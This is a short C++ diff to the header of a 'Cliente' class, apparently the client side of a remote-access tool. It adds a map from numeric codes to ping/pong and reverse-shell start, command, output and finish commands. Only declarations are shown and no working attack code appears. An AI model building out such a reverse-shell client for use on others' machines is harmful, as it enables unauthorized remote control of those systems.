@@ -14,8 +14,20 @@ class Cliente {
 		ByteArray bKey;
 		void Init_Key();
 
-		ReverseShell* reverseSHELL;
+		ReverseShell* reverseSHELL = nullptr;
+
+		
 	public:
+
+		std::map<std::string, EnumComandos::Enum> Comandos = {
+			{"499", EnumComandos::PONG},
+			{"500", EnumComandos::PING},
+			{"501", EnumComandos::Reverse_Shell_Start},
+			{"502", EnumComandos::Reverse_Shell_Command},
+			{"503", EnumComandos::Reverse_Shell_Salida},
+			{"504", EnumComandos::Reverse_Shell_Finish}
+		};
+
 		Cliente();
 		~Cliente();
 		
